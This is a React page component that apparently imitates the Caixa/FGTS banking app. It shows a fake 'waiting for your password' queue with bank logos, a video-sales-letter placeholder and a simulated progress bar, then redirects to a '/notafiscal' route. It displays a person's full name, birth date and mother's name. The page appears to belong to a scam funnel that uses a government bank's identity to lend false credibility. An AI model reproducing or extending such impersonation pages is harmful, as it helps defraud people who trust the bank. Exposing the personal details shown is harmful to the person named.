import { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import logo from "../assets/caixalogo.png";
import flogo from "../assets/f-logo.png";
import logofgts from "../assets/fgts2.png";
import { FaAngleRight } from "react-icons/fa";

// Página de espera com VSL e progressão dinâmica
export function AguardarSenha() {
    const [progress, setProgress] = useState(0); // Progresso da espera
    const navigate = useNavigate();

    // Simula a progressão de 30 segundos
    useEffect(() => {
        const duration = 10000; // 30 segundos
        const start = Date.now();

        const updateProgress = () => {
            const elapsed = Date.now() - start;
            const newProgress = Math.min((elapsed / duration) * 100, 100);
            setProgress(newProgress);

            if (newProgress < 100) {
                requestAnimationFrame(updateProgress); // Continua a animação até 100%
            } else {
                navigate("/notafiscal"); // Redireciona para o menu ao final
            }
        };

        updateProgress();
    }, [navigate]);

    return (
        <div className="w-screen h-screen flex flex-col items-center text-white bg-[#025bab]">
            {/* Cabeçalho com o logo e nome do usuário */}
            <header className="flex w-full flex-col p-4 space-y-8 bg-[#025bab] pb-8">
                <div className="flex items-center justify-between w-full">
                    <div className="flex items-center space-x-3">
                        <img width={34} src={logo} alt="logo" />
                        <span className="text-white font-extralight">Olá, VICTOR</span>
                    </div>
                    <img src={logofgts} alt="fgts" width={65} />
                </div>

            </header>

            <div className="rounded-lg bg-primary text-white mt-2">
                <div className="rounded-lg space-y-10">
                    <div className="flex items-lef space-x-2">
                        <div className="bg-orange-400 p-2 rounded-full w-fit">
                            <img src={flogo} alt="flogo" width={20} />
                        </div>
                        <h2 className="font-bold text-2xl">
                            Aguardando senha...
                        </h2>
                    </div>

                    <div className="font-bold text-xl flex flex-col  space-y-2">
                        <div className="flex items-center justify-between">
                            <h3>VICTOR SOUZA ALMEIDA</h3>
                            <FaAngleRight />
                        </div>

                        <span className="font-thin text-zinc-300">Nascimento: 21/09/2004</span>
                        <span className="font-thin text-zinc-300">Mãe: Carla Soares</span>
                    </div>
                    <span className="border-b border-b-zinc-800 my-2" />
                </div>
            </div>

            {/* VSL (Video Sales Letter) */}
            <div className="w-full h-64 bg-gray-200 mt-4 flex items-center justify-center">
                <p className="text-gray-600 text-lg">Assistindo VSL enquanto sua senha é chamada...</p>
            </div>

            {/* Barra de progresso */}
            <div className="w-3/4 bg-gray-300 rounded-full h-4 mt-6">
                <div
                    className="bg-orange-500 h-4 rounded-full transition-all ease-linear"
                    style={{ width: `${progress}%` }}
                />
            </div>

            <span className="text-sm text-zinc-200 mt-2">{Math.floor(progress)}% concluído</span>

            {/* Mensagem de espera */}
            <div className="text-center mt-8 px-4">
                <h2 className="text-lg text-zinc-300">Aguarde sua senha ser chamada...</h2>
                <p className="text-sm text-zinc-400">Estamos preparando seu atendimento. Por favor, aguarde um momento.</p>
            </div>
        </div>
    );
}
